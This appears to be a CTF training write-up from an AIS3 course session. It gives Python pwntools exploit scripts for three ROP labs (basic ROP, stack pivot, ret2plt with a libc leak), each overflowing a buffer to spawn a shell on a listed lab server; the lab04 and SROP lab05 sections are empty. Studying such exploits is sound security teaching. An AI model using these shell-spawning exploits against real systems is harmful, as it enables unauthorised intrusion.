---
title: "【AIS3】Gadget 不只有 POP 可以用"
date: 2024-07-31
tags:
  - CTF
---

# Gadget 不只有 POP 可以用

`-undefined 戰隊 林宇翔`

## ROP gadgets

[【系統安全】Stack Overflow ](/posts/2024/stack_overflow/#rop)

## Basic ROP


### lab01 solution

```py
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./rop1')
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = '35.229.243.81'
    port = 10101
    p = remote(ip, port)
else:
    p = process()

payload = b"/bin/sh\x00"
p.sendlineafter(b"What is your name? ", payload)

pop_rax = 0x44fd87
pop_rdi = 0x401f4f
pop_rax_rdx_rbx = 0x485baa
name = 0x4c7300
syscall = 0x401d04

p.recvuntil(b"You have a buffer overflow vuln: ")

offset = 24
padding = b"A"*24
payload = flat([padding, pop_rdi, name, pop_rax_rdx_rbx, 59, 0, 0, syscall])

p.sendline(payload)

p.interactive()
```

## Stack Pivot

### lab02 solution

```py
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./rop2')
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = '35.229.243.81'
    port = 10102
    p = remote(ip, port)
else:
    p = process()

leave_ret = 0x4017ee # leave = mov rsp, rbp ; pop rbp ;
pop_rdi = 0x401f4f
pop_rsi = 0x409f7e
pop_rdx_rbx = 0x485bab
pop_rax = 0x44fd87
name = 0x4c7300
syscall = 0x401d04


payload = b"/bin/sh\x00" 
payload += p64(pop_rax)+ p64(59)+p64(pop_rsi) + p64(0) + p64(pop_rdi)+p64(name)+p64(pop_rdx_rbx)+ p64(0) +p64(0)+p64( syscall)
p.sendlineafter(b"What is your name? ", payload)

p.recvuntil(b"You have a buffer overflow vuln: ")

offset = 0x10
padding = b"A"*offset
payload = flat([padding, name, leave_ret])

p.sendline(payload)

p.interactive()
```

## Tricks in dynamic link library which generated by new compiler

### lab03 solution

```py
#!/usr/bin/env python3
from pwn import *

# ret2plt
elf = context.binary = ELF('./rop3')
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = '35.229.243.81'
    port = 10103
    p = remote(ip, port)
else:
    p = process()

read_got = 0x404020
pop_rdi = 0x4011f9
ret = 0x40101a
printf_plt = 0x401060
main = elf.sym['main']

p.sendlineafter(b"What is your name? ", "1234")



p.recvuntil(b"You have a buffer overflow vuln: ")

offset = 0x18
padding = b"A"*offset
payload = padding + p64(ret) + p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(ret) + p64(main)
p.sendline(payload)

leak = u64(p.recv(6).ljust(8, b"\x00"))

info(hex(leak))

leak_base = leak - 0x1149c0

system = leak_base + 0x50d70
binsh = leak_base + 0x1d8698

p.sendlineafter(b"What is your name? ", "1234")
p.recvuntil(b"You have a buffer overflow vuln: ")

payload = padding + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(payload)

p.interactive()
```

### lab04

## SROP

### lab05







